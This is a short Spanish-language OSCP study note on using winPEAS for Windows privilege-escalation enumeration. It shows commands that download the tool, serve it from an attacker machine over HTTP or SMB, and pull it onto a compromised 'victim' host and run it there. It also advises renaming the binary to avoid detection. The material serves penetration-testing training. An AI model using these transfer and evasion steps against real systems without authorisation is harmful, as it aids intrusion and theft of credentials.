`winPEAS` es una herramienta automática de enumeración para Windows enfocada en detectar configuraciones débiles y vectores de escalada. Está permitida en el OSCP siempre que se use la versión `.exe` (no la `.bat` ni la `ps1`).

---

## Descarga

Desde tu máquina atacante:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe
```

---

## Transferencia a la víctima

Puedes usar cualquiera de estos métodos:

### HTTP Server
```bash
python3 -m http.server 80
```
En la víctima:
```powershell
powershell -c "Invoke-WebRequest http://<IP>:80/winPEASany.exe -OutFile C:\Windows\Temp\winpeas.exe"
```

### SMB Server
```bash
sudo impacket-smbserver SHARE $(pwd) -smb2support
```
En la víctima:
```cmd
copy \\<IP>\SHARE\winPEASany.exe C:\Windows\Temp\winpeas.exe
```

---

## Ejecución

```cmd
cd C:\Windows\Temp
winpeas.exe
```

Se recomienda ejecutar desde `cmd.exe` o `powershell.exe` en lugar de shells interactivas no nativas.

---

## Qué detecta

- Servicios mal configurados
- Permisos de escritura inseguros
- Binarios con capacidades elevadas
- Contraseñas en archivos o registros
- Usuarios, grupos, privilegios
- Rutas interesantes y binarios SUID

---

## Interpretación

- Salida codificada por colores (si tu consola lo soporta):
  - Verde: información
  - Amarillo: potencialmente útil
  - Rojo: muy probable escalada

Si no ves colores, puedes redirigir la salida a un archivo:
```cmd
winpeas.exe > resultado.txt
```

---

## Casos de Uso en OSCP

- Detectar permisos inseguros sobre servicios o binarios
- Encontrar scripts o configuraciones con contraseñas hardcodeadas
- Identificar rutas de escalada directa (tareas programadas, credenciales, etc.)

---

## Buenas Prácticas

- Ejecutar nada más comprometer un Windows
- Transferir como `winpeas.exe` para evitar detección o bloqueo
- Guardar salida y analizar con calma si hay muchos resultados

---
